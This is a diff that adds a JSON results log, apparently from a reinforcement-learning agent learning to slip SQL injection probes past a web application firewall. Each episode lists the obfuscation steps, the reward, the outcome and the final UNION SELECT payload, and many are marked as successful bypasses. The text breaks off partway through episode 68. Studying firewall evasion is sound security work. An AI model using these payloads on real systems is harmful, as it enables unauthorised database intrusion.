@@ -1,0 +1,4730 @@
+[
+  {
+    "episode": 1,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case",
+      "formfeed"
+    ],
+    "final_payload": "0'%0cuNIOn%0cselecT%0c1,2,'3"
+  },
+  {
+    "episode": 2,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "newline",
+      "comment",
+      "comment",
+      "tab_space",
+      "comment",
+      "ver_urlenc",
+      "newline",
+      "comment",
+      "comment",
+      "comment",
+      "newline",
+      "tab_space",
+      "newline",
+      "case",
+      "comment"
+    ],
+    "final_payload": "0'%0a/*!50001%55NION*/%0a/*!50001%53ELECT*/%0a1,2,'3"
+  },
+  {
+    "episode": 3,
+    "steps": 15,
+    "total_reward": -12.1,
+    "success": false,
+    "final_result": "SQL_ERROR",
+    "sequence": [
+      "formfeed",
+      "backtick",
+      "comment",
+      "comment",
+      "case_split",
+      "formfeed",
+      "hash_nl_all",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "comment",
+      "newline",
+      "char_split"
+    ],
+    "final_payload": "0'%0c`uNion`%0c`sELEct`%0c1,2,'3"
+  },
+  {
+    "episode": 4,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "comment",
+      "hex_encode",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "tab_space",
+      "comment",
+      "comment",
+      "newline",
+      "comment"
+    ],
+    "final_payload": "0'/**/UNION/**/SELECT/**/0x31,0x32,'3"
+  },
+  {
+    "episode": 5,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "tab_space",
+      "comment",
+      "comment",
+      "nested_or",
+      "double_and",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "unhex_wrap",
+      "char_split",
+      "comment",
+      "comment",
+      "newline"
+    ],
+    "final_payload": "0'%09/*U*//*N*//*I*//*O*//*N*/%09/*S*//*E*//*L*//*E*//*C*//*T*/%091,2,'3"
+  },
+  {
+    "episode": 6,
+    "steps": 4,
+    "total_reward": 3.2,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "formfeed",
+      "formfeed",
+      "comment",
+      "case_split"
+    ],
+    "final_payload": "0'%0cuNIon%0cSeLeCt%0c1,2,'3"
+  },
+  {
+    "episode": 7,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "crlf",
+      "hex_encode",
+      "comment",
+      "comment",
+      "hex_encode",
+      "comment",
+      "backtick",
+      "comment",
+      "comment",
+      "url_encode",
+      "tab_space",
+      "comment",
+      "comment",
+      "newline",
+      "case"
+    ],
+    "final_payload": "0'%0d%0a`%55NION`%0d%0a`%53ELECT`%0d%0a0x30x31,0x32,'3"
+  },
+  {
+    "episode": 8,
+    "steps": 10,
+    "total_reward": -12.4,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "vtab",
+      "formfeed",
+      "newline",
+      "hex_encode",
+      "plus_sep",
+      "comment",
+      "comment",
+      "between_space",
+      "comment",
+      "case"
+    ],
+    "final_payload": "0'%0bUnIon%0bseLeCt%0b0x31,0x32,'3"
+  },
+  {
+    "episode": 9,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "between_space",
+      "comment",
+      "nested_or",
+      "ver_urlenc",
+      "comment",
+      "plus_sep",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "crlf",
+      "double_encode",
+      "comment",
+      "newline"
+    ],
+    "final_payload": "0'%a0/*!50001%55NION*/%a0/*!50001%53ELECT*/%a01,2,'3"
+  },
+  {
+    "episode": 10,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "hex_encode",
+      "case",
+      "case_split",
+      "comment",
+      "tab_space",
+      "comment",
+      "ver_urlenc",
+      "comment",
+      "tab_space",
+      "case_split",
+      "concat_char",
+      "paren_full",
+      "comment",
+      "comment",
+      "newline"
+    ],
+    "final_payload": "0'/**/uNIon(SELEcT/**/(0x31),(0x32),('3))"
+  },
+  {
+    "episode": 11,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "gbk_bypass",
+      "comment",
+      "comment",
+      "between_space",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "formfeed",
+      "comment",
+      "comment",
+      "newline"
+    ],
+    "final_payload": "0%bf%27/**/UNION/**/SELECT/**/1,2,%bf%273"
+  },
+  {
+    "episode": 12,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "paren_space",
+      "formfeed",
+      "comment",
+      "comment",
+      "hash_nl",
+      "nested_and",
+      "comment",
+      "comment",
+      "between_space",
+      "comment",
+      "char_split",
+      "newline",
+      "newline",
+      "comment",
+      "concat_char"
+    ],
+    "final_payload": "0'%0c/*U*//*N*//*I*//*O*//*N*/(/*S*//*E*//*L*//*E*//*C*//*T*/%0c(1),(2),('3))"
+  },
+  {
+    "episode": 13,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "plus_sep",
+      "comment",
+      "comment",
+      "comment",
+      "double_encode",
+      "case_split",
+      "comment",
+      "between_space",
+      "comment",
+      "case_split",
+      "tab_space",
+      "formfeed",
+      "comment",
+      "comment",
+      "newline"
+    ],
+    "final_payload": "0'+UnIoN+selECT+1,2,'3"
+  },
+  {
+    "episode": 14,
+    "steps": 3,
+    "total_reward": 5.52,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "formfeed",
+      "tab_space",
+      "case_split"
+    ],
+    "final_payload": "0'%0cUnIoN%0cselECT%0c1,2,'3"
+  },
+  {
+    "episode": 15,
+    "steps": 15,
+    "total_reward": -27.1,
+    "success": false,
+    "final_result": "SQL_ERROR",
+    "sequence": [
+      "double_encode",
+      "comment",
+      "scientific",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "case_split",
+      "comment",
+      "comment",
+      "newline",
+      "comment"
+    ],
+    "final_payload": "0'%2520uNion%2520SeLeCt%25201,2,'3"
+  },
+  {
+    "episode": 16,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "nested_or",
+      "comment",
+      "comment",
+      "comment",
+      "newline",
+      "keyword_split",
+      "comment",
+      "case_split",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "crlf",
+      "comment"
+    ],
+    "final_payload": "0'/**/UN/**/ION/**/SEL/**/ECT/**/1,2,'3"
+  },
+  {
+    "episode": 17,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "param_pollute",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "nested_and",
+      "comment"
+    ],
+    "final_payload": "0'/**/UNION/*&x=1*/SELECT/*&x=1*/1,2,'3"
+  },
+  {
+    "episode": 18,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 19,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "url_encode",
+      "hash_nl_all",
+      "comment",
+      "comment",
+      "between_space",
+      "between_space",
+      "char_split",
+      "comment",
+      "tab_space",
+      "newline",
+      "comment",
+      "between_space",
+      "scientific",
+      "comment",
+      "comment"
+    ],
+    "final_payload": "0'%23aa%0A%55NION%23aa%0A%53ELECT%23aa%0A1,2,'3"
+  },
+  {
+    "episode": 20,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "url_mid_char",
+      "comment",
+      "newline",
+      "case",
+      "comment",
+      "tab_space",
+      "hex_encode",
+      "comment",
+      "comment",
+      "tab_space",
+      "comment",
+      "formfeed",
+      "comment",
+      "newline",
+      "between_space"
+    ],
+    "final_payload": "0'/**/UN%49ON/**/SEL%45CT/**/1,2,'3"
+  },
+  {
+    "episode": 21,
+    "steps": 4,
+    "total_reward": 3.2,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "formfeed",
+      "crlf",
+      "comment",
+      "case_split"
+    ],
+    "final_payload": "0'%0cUnIoN%0cSeLeCt%0c1,2,'3"
+  },
+  {
+    "episode": 22,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "keyword_split",
+      "comment",
+      "tab_space",
+      "comment",
+      "convert_charset",
+      "formfeed",
+      "comment",
+      "tab_space",
+      "comment",
+      "param_pollute",
+      "scientific",
+      "comment",
+      "tab_space",
+      "case_split",
+      "gbk_bypass"
+    ],
+    "final_payload": "0%bf%27/**/UN/**/ION/**/SEL/**/ECT/**/1,2,%bf%273"
+  },
+  {
+    "episode": 23,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "char_split",
+      "comment",
+      "nested_union",
+      "comment",
+      "tab_space",
+      "comment",
+      "tab_space",
+      "formfeed",
+      "char_split",
+      "comment",
+      "newline",
+      "comment",
+      "tab_space",
+      "comment",
+      "crlf"
+    ],
+    "final_payload": "0'%09/*U*//*N*//*I*//*O*//*N*/%09/*S*//*E*//*L*//*E*//*C*//*T*/%091,2,'3"
+  },
+  {
+    "episode": 24,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "ver_50000",
+      "comment",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "crlf",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline"
+    ],
+    "final_payload": "0'%0a/*!50000UNION*/%0a/*!50000SELECT*/%0a1,2,'3"
+  },
+  {
+    "episode": 25,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "ver_00000",
+      "comment",
+      "newline",
+      "newline",
+      "tab_space",
+      "comment",
+      "double_and",
+      "comment",
+      "tab_space",
+      "comment",
+      "convert_charset",
+      "comment",
+      "tab_space",
+      "comment",
+      "crlf"
+    ],
+    "final_payload": "0'%0a/*!00000UNION*/%0a/*!00000SELECT*/%0a1,2,'3"
+  },
+  {
+    "episode": 26,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "ver_12345",
+      "comment",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "concat_char",
+      "comment",
+      "comment",
+      "newline",
+      "between_space",
+      "comment",
+      "comment",
+      "hex_encode"
+    ],
+    "final_payload": "0'%0a/*!12345UNION/**/SELECT*/%0a1,2,'3"
+  },
+  {
+    "episode": 27,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 28,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "dbl_url_comment",
+      "comment",
+      "crlf",
+      "comment",
+      "crlf",
+      "double_encode",
+      "between_space",
+      "newline",
+      "comment",
+      "crlf",
+      "comment",
+      "vtab",
+      "comment",
+      "vtab",
+      "newline"
+    ],
+    "final_payload": "0'/**/UNION/**/SELECT/**/1,2,'3"
+  },
+  {
+    "episode": 29,
+    "steps": 15,
+    "total_reward": -34.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "between_space",
+      "newline",
+      "comment",
+      "case_split",
+      "backtick",
+      "paren_space",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "hash_nl_all",
+      "comment"
+    ],
+    "final_payload": "0'%a0UnIoN(SELECT/**/(1),(2),('3))"
+  },
+  {
+    "episode": 30,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "ver_urlenc",
+      "comment",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "hash_nl_all",
+      "hash_nl_all",
+      "comment",
+      "tab_space",
+      "comment",
+      "url_mid_char",
+      "ver_newline",
+      "comment",
+      "comment"
+    ],
+    "final_payload": "0'%0a/*!50000%55NION*/%0a/*!50000%53ELECT*/%0a1,2,'3"
+  },
+  {
+    "episode": 31,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "ver_newline",
+      "comment",
+      "concat_char",
+      "comment",
+      "double_or",
+      "newline",
+      "dbl_url_comment",
+      "comment",
+      "param_pollute",
+      "comment",
+      "crlf",
+      "newline",
+      "comment",
+      "hash_nl",
+      "formfeed"
+    ],
+    "final_payload": "0'%252f%252a*/%0A/*!50000%55NION*/%0d%0a/*!%53ELECT*/%0A%252f%252a*/1,2,'3"
+  },
+  {
+    "episode": 32,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "paren_full",
+      "comment",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "nested_and",
+      "comment",
+      "vtab",
+      "comment",
+      "comment",
+      "newline"
+    ],
+    "final_payload": "0'/**/UNION(SELECT/**/(1),(2),('3))"
+  },
+  {
+    "episode": 33,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "ver_00000",
+      "newline",
+      "comment",
+      "paren_full",
+      "comment",
+      "comment",
+      "crlf",
+      "comment",
+      "vtab",
+      "comment",
+      "tab_space",
+      "newline",
+      "ver_50000",
+      "comment",
+      "vtab"
+    ],
+    "final_payload": "0'%0a/*!00000UNION*/%0a/*!00000SELECT*/%0a1,2,'3"
+  },
+  {
+    "episode": 34,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "hash_nl",
+      "comment",
+      "comment",
+      "nested_union",
+      "comment",
+      "url_mid_char",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "url_encode",
+      "comment",
+      "between_space",
+      "comment"
+    ],
+    "final_payload": "0'/**/UNIun%69onON%23aaa%0ASELsel%65ctECT/**/1,2,'3"
+  },
+  {
+    "episode": 35,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "hash_nl_all",
+      "unhex_wrap",
+      "comment",
+      "comment",
+      "between_space",
+      "nested_union",
+      "comment",
+      "backtick",
+      "comment",
+      "comment",
+      "newline",
+      "case",
+      "between_space",
+      "tab_space",
+      "ver_urlenc"
+    ],
+    "final_payload": "0'%23aa%0AUNI`UNion`ON%23aa%0ASEL`SeLEct`ECT%23aa%0A1,2,'3"
+  },
+  {
+    "episode": 36,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "nested_and",
+      "comment",
+      "vtab",
+      "comment",
+      "gbk_bypass",
+      "comment",
+      "tab_space",
+      "comment",
+      "crlf",
+      "comment",
+      "newline",
+      "char_split",
+      "comment",
+      "tab_space",
+      "comment"
+    ],
+    "final_payload": "0%bf%27/**//*U*//*N*//*I*//*O*//*N*//**//*S*//*E*//*L*//*E*//*C*//*T*//**/1,2,%bf%273"
+  },
+  {
+    "episode": 37,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "nested_union",
+      "comment",
+      "formfeed",
+      "comment",
+      "case_split",
+      "comment",
+      "comment",
+      "newline",
+      "hex_encode",
+      "url_encode",
+      "paren_full",
+      "comment",
+      "ver_urlenc",
+      "comment",
+      "comment"
+    ],
+    "final_payload": "0'/**/UNIuNiOnON/**/SELseLectECT/**/1,2,'3"
+  },
+  {
+    "episode": 38,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "double_or",
+      "comment",
+      "formfeed",
+      "keyword_split",
+      "comment",
+      "vtab",
+      "comment",
+      "newline",
+      "newline",
+      "ver_12345",
+      "comment",
+      "between_space",
+      "comment",
+      "between_space",
+      "newline"
+    ],
+    "final_payload": "0'/**/UN/**/ION/**/SEL/**/ECT/**/1,2,'3"
+  },
+  {
+    "episode": 39,
+    "steps": 3,
+    "total_reward": 5.52,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "double_and",
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 40,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "hex_encode",
+      "comment",
+      "comment",
+      "crlf",
+      "comment",
+      "case",
+      "comment",
+      "crlf",
+      "comment",
+      "newline",
+      "comment",
+      "crlf",
+      "comment",
+      "tab_space",
+      "hex_encode"
+    ],
+    "final_payload": "0'/**/unION/**/selECT/**/0x30x31,0x32,'3"
+  },
+  {
+    "episode": 41,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "scientific",
+      "comment",
+      "between_space",
+      "url_encode",
+      "comment",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "nested_and"
+    ],
+    "final_payload": "0'/**/%55NION/**/%53ELECT/**/1e0,2e0,'3"
+  },
+  {
+    "episode": 42,
+    "steps": 15,
+    "total_reward": -17.1,
+    "success": false,
+    "final_result": "UNKNOWN",
+    "sequence": [
+      "concat_char",
+      "comment",
+      "comment",
+      "scientific",
+      "concat_char",
+      "newline",
+      "comment",
+      "comment",
+      "tab_space",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "case_split",
+      "comment"
+    ],
+    "final_payload": "0CONCAT(CHAR(32,85,78,73,79,78,32,83,69,76,69,67,84,32,49,44,50,44))3"
+  },
+  {
+    "episode": 43,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "unhex_wrap",
+      "comment",
+      "dbl_url_comment",
+      "comment",
+      "crlf",
+      "comment",
+      "tab_space",
+      "comment",
+      "crlf",
+      "comment",
+      "newline",
+      "formfeed",
+      "newline",
+      "comment",
+      "tab_space"
+    ],
+    "final_payload": "0'%252f%252a*/UNION%252f%252a*/SELECT%252f%252a*/1,2,'3"
+  },
+  {
+    "episode": 44,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "convert_charset",
+      "comment",
+      "plus_sep",
+      "comment",
+      "formfeed",
+      "comment",
+      "unhex_wrap",
+      "comment",
+      "crlf",
+      "newline",
+      "hex_encode",
+      "comment",
+      "tab_space",
+      "comment",
+      "case_split"
+    ],
+    "final_payload": "0'/**/uNion/**/seLect/**/0x31,0x32,'3"
+  },
+  {
+    "episode": 45,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "distinct",
+      "comment",
+      "comment",
+      "comment",
+      "gbk_bypass",
+      "double_or",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "char_split",
+      "comment",
+      "comment",
+      "tab_space",
+      "hash_nl_all"
+    ],
+    "final_payload": "0%bf%27/**//*U*//*N*//*I*//*O*//*N*//**/DISTINCTROW/**//*S*//*E*//*L*//*E*//*C*//*T*//**/1,2,%bf%273"
+  },
+  {
+    "episode": 46,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "hex_encode",
+      "paren_full",
+      "comment",
+      "comment",
+      "newline",
+      "nested_and",
+      "ver_urlenc",
+      "newline",
+      "comment",
+      "scientific",
+      "comment",
+      "comment",
+      "comment",
+      "newline",
+      "double_encode"
+    ],
+    "final_payload": "0'/**//*!50001%55NION*/(/*!50001%53ELECT*//**/(0x31),(0x32),('3))"
+  },
+  {
+    "episode": 47,
+    "steps": 15,
+    "total_reward": -7.1,
+    "success": false,
+    "final_result": "SQL_ERROR",
+    "sequence": [
+      "backtick",
+      "case_split",
+      "newline",
+      "url_encode",
+      "comment",
+      "double_or",
+      "comment",
+      "formfeed",
+      "comment",
+      "nested_and",
+      "hash_nl",
+      "comment",
+      "comment",
+      "newline",
+      "comment"
+    ],
+    "final_payload": "0'%0a`uNIon`%0a`SeLeCt`%0a1,2,'3"
+  },
+  {
+    "episode": 48,
+    "steps": 15,
+    "total_reward": -17.1,
+    "success": false,
+    "final_result": "UNKNOWN",
+    "sequence": [
+      "concat_char",
+      "case",
+      "comment",
+      "comment",
+      "newline",
+      "newline",
+      "newline",
+      "comment",
+      "url_encode",
+      "comment",
+      "tab_space",
+      "newline",
+      "newline",
+      "tab_space",
+      "comment"
+    ],
+    "final_payload": "0CoNCaT(CHAR(32,85,78,73,79,78,32,83,69,76,69,67,84,32,49,44,50,44))3"
+  },
+  {
+    "episode": 49,
+    "steps": 15,
+    "total_reward": -17.1,
+    "success": false,
+    "final_result": "UNKNOWN",
+    "sequence": [
+      "concat_char",
+      "newline",
+      "comment",
+      "tab_space",
+      "newline",
+      "crlf",
+      "comment",
+      "newline",
+      "tab_space",
+      "tab_space",
+      "crlf",
+      "comment",
+      "comment",
+      "newline",
+      "crlf"
+    ],
+    "final_payload": "0CONCAT(CHAR(32,85,78,73,79,78,32,83,69,76,69,67,84,32,49,44,50,44))3"
+  },
+  {
+    "episode": 50,
+    "steps": 15,
+    "total_reward": -17.1,
+    "success": false,
+    "final_result": "UNKNOWN",
+    "sequence": [
+      "concat_char",
+      "tab_space",
+      "comment",
+      "crlf",
+      "comment",
+      "vtab",
+      "comment",
+      "crlf",
+      "url_encode",
+      "newline",
+      "comment",
+      "nested_or",
+      "comment",
+      "tab_space",
+      "newline"
+    ],
+    "final_payload": "0CONCAT(CHAR(32,85,78,73,79,78,32,83,69,76,69,67,84,32,49,44,50,44))3"
+  },
+  {
+    "episode": 51,
+    "steps": 15,
+    "total_reward": -17.1,
+    "success": false,
+    "final_result": "UNKNOWN",
+    "sequence": [
+      "concat_char",
+      "crlf",
+      "comment",
+      "case",
+      "comment",
+      "formfeed",
+      "ver_00000",
+      "comment",
+      "vtab",
+      "case",
+      "paren_space",
+      "comment",
+      "crlf",
+      "between_space",
+      "comment"
+    ],
+    "final_payload": "0cOnCat(CHAR(32,85,78,73,79,78,32,83,69,76,69,67,84,32,49,44,50,44))3"
+  },
+  {
+    "episode": 52,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "comment",
+      "double_encode",
+      "comment",
+      "between_space",
+      "comment",
+      "plus_sep",
+      "char_split",
+      "comment",
+      "hash_nl",
+      "comment",
+      "backtick",
+      "comment",
+      "double_and",
+      "comment",
+      "formfeed"
+    ],
+    "final_payload": "0'/**//*U*//*N*//*I*//*O*//*N*//**//*S*//*E*//*L*//*E*//*C*//*T*//**/1,2,'3"
+  },
+  {
+    "episode": 53,
+    "steps": 15,
+    "total_reward": -9.6,
+    "success": false,
+    "final_result": "SQL_ERROR",
+    "sequence": [
+      "between_space",
+      "tab_space",
+      "comment",
+      "case_split",
+      "backtick",
+      "case_split",
+      "comment",
+      "comment",
+      "newline",
+      "plus_sep",
+      "comment",
+      "comment",
+      "comment",
+      "newline",
+      "comment"
+    ],
+    "final_payload": "0'%a0unION%a0sElEcT%a01,2,'3"
+  },
+  {
+    "episode": 54,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "double_or",
+      "newline",
+      "hash_nl",
+      "comment",
+      "newline",
+      "newline",
+      "comment",
+      "case_split",
+      "comment",
+      "tab_space",
+      "comment",
+      "crlf",
+      "comment",
+      "comment",
+      "tab_space"
+    ],
+    "final_payload": "0'%0aUNIoN%23xyz%0AsElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 55,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "distinct",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "plus_sep",
+      "unhex_wrap",
+      "formfeed",
+      "comment",
+      "formfeed",
+      "newline",
+      "nested_union",
+      "comment",
+      "comment"
+    ],
+    "final_payload": "0'%0aUNIunionON%0aDISTINCT%0aSELselectECT%0a1,2,'3"
+  },
+  {
+    "episode": 56,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "newline",
+      "newline",
+      "tab_space",
+      "plus_sep",
+      "comment",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "vtab"
+    ],
+    "final_payload": "0'%0aUNION%0aSELECT%0a1,2,'3"
+  },
+  {
+    "episode": 57,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "tab_space",
+      "case_split"
+    ],
+    "final_payload": "0'%09UnIoN%09seLect%091,2,'3"
+  },
+  {
+    "episode": 58,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "crlf",
+      "comment",
+      "double_and",
+      "comment",
+      "newline",
+      "comment",
+      "tab_space",
+      "url_encode",
+      "comment",
+      "tab_space",
+      "comment",
+      "hex_encode",
+      "comment",
+      "comment",
+      "newline"
+    ],
+    "final_payload": "0'%0d%0a%55NION%0d%0a%53ELECT%0d%0a1,2,'3"
+  },
+  {
+    "episode": 59,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 60,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 61,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 62,
+    "steps": 15,
+    "total_reward": -29.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "between_space",
+      "crlf",
+      "comment",
+      "case_split",
+      "backtick",
+      "case_split",
+      "newline",
+      "ver_12345",
+      "hash_nl_all",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline"
+    ],
+    "final_payload": "0'%a0/*!12345UnIoN%23xx%0AsElEcT*/%a01,2,'3"
+  },
+  {
+    "episode": 63,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 64,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 65,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 66,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 67,
+    "steps": 3,
+    "total_reward": 5.52,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 68,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
